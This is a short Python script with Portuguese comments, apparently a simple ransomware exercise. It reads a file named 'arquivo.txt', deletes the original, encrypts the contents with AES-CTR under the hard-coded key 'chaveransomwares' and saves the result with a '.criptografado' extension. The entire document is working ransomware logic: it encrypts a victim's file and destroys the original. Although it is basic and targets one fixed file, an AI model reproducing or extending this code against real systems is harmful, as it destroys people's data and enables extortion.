import os
import pyaes

# Abre o arquivo a ser criptografado

file_name = "arquivo.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Remove o arquivo

os.remove(file_name)

# Defini a chave de criptografia

key = b"chaveransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografa o arquivo

crypto_data = aes.encrypt(file_data)

# Salva o arquivo criptografado

new_file = file_name + ".criptografado"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
